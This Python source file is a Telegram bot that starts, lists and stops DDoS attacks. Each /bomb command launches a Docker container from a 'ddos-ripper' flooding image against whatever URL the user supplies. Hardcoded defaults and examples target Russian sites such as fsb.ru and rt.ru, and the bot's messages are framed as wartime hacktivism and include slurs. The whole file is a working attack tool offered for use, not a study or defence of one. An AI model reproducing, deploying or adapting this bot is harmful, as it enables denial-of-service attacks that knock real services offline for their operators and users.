import re
import docker
import telebot

import config

from uuid import uuid4

from keyboards import list_keyboard, remove_ddos_keyboard


docker_client = docker.from_env()
bot = telebot.TeleBot(config.API_TOKEN)


def get_context(call, separator='$'):
    return call.data[call.data.find(separator)+1:]


def list_ddoses():
    return [container for container in docker_client.containers.list() if 'ddos' in container.name]


def readable_url(url):
    return


def create_ddos(cyka_url='www.fsb.ru'):
    return docker_client.containers.run(image='nitupkcuf/ddos-ripper:latest', name=f"ddos_{cyka_url.replace('.', '_')}_{uuid4().hex}",
                                        remove=True, command=cyka_url, detach=True)


def extract_arg(arg):
    return arg.split()[1:]


@bot.message_handler(commands=['start', 'help'])
def start_command(message):
    user = message.from_user

    bot.send_message(message.chat.id, "This is a bot for helping Ukraine to defend against 🇷🇺Huilo in a cyber war.\nUsage:\n"
                                      "1. /bomb <url> - to start ddosing a russian pidor\n"
                                      "2. /list - to list currently running ddoses\nSimple isn't it? 🇺🇦Slava Ukraini!")


@bot.message_handler(commands=['bomb'])
def bomb_command(message):
    args = extract_arg(message.text)

    if len(args) == 0:
        bot.send_message(message.chat.id, text='Enter a url, please.\nExample: /bomb www.rt.ru')
        return

    cyka_url = args[0]
    container = create_ddos(cyka_url)
    bot.send_message(message.chat.id, text=f"Started bombing {get_url_from_container(container)}! 🇺🇦Heroyam Slava!")
    
    
def get_ddos_list(page):
    ddos_list = list_ddoses()

    if len(ddos_list) == 0:
        return f'No DDOSes!', None

    output_list = []
    for i, container in enumerate(ddos_list):
        url = get_url_from_container(container)
        output_list.append(f"{i + 1}. {url}\n")

    return '\n'.join(output_list), list_keyboard(len(output_list), page)


@bot.message_handler(commands=['list'])
def list_command(message):
    ddoses, kb = get_ddos_list(0)

    bot.send_message(message.chat.id, text=ddoses, reply_markup=kb)
    
    
def search_container_by_name(container_name):
    return [ddos for ddos in list_ddoses() if ddos.name == container_name][0]


def get_url_from_container(container):
    return f"{re.search('^ddos_(.*)_', container.name).groups()[0].replace('_', '.')}"
    
    
@bot.callback_query_handler(func=lambda call: 'ddos_' in call.data)
def job_callback_handler(call):
    if 'ddos_remove' in call.data:
        container = search_container_by_name(get_context(call))
        ddos_list_text, ddoslist_keyboard = get_ddos_list(page=0)

        bot.edit_message_text(message_id=call.message.message_id, chat_id=call.from_user.id,
                              text=f"{ddos_list_text}\n\nWait a bit for a container to stop!",
                              reply_markup=ddoslist_keyboard)

        container.stop()
        
        bot.edit_message_text(message_id=call.message.message_id, chat_id=call.from_user.id,
                              text=f"{ddos_list_text}\n\nStopped!",
                              reply_markup=ddoslist_keyboard)

    elif call.data == 'ddos_back_to_list':
        ddos_list_text, ddoslist_keyboard = get_ddos_list(page=0)
        bot.edit_message_text(message_id=call.message.message_id, chat_id=call.from_user.id, text=ddos_list_text,
                              reply_markup=ddoslist_keyboard)
    
    
@bot.callback_query_handler(func=lambda call: 'ddoslist_select' in call.data)
def ddoslist_select_callback_handler(call):
    digit = int(get_context(call)) - 1
    container = list_ddoses()[digit]
    output_text = get_url_from_container(container)

    bot.edit_message_text(message_id=call.message.message_id, chat_id=call.from_user.id, text=output_text,
                          reply_markup=remove_ddos_keyboard(container.name, 'en'))
    
    
@bot.callback_query_handler(func=lambda call: 'ddoslist_cancel' in call.data)
def ddoslist_cancel_callback_handler(call):
    bot.edit_message_text(message_id=call.message.message_id, chat_id=call.from_user.id,
                          text="Ok")


@bot.callback_query_handler(func=lambda call: 'arrow_' in call.data)
def ddoslist_arrows_handler(call):
    if 'ddoslist_arrow_left' in call.data:
        page = int(get_context(call)) - 1
        ddos_list_text, ddoslist_keyboard = get_ddos_list(page)

        bot.edit_message_text(message_id=call.message.message_id, chat_id=call.from_user.id, text=ddos_list_text,
                              reply_markup=ddoslist_keyboard)

    if 'ddoslist_arrow_right' in call.data:
        page = int(get_context(call)) + 1
        ddos_list_text, ddoslist_keyboard = get_ddos_list(page)

        bot.edit_message_text(message_id=call.message.message_id, chat_id=call.from_user.id, text=ddos_list_text,
                              reply_markup=ddoslist_keyboard)


bot.enable_save_next_step_handlers(delay=2)
bot.load_next_step_handlers()

print('Bot Started!')
bot.infinity_polling()
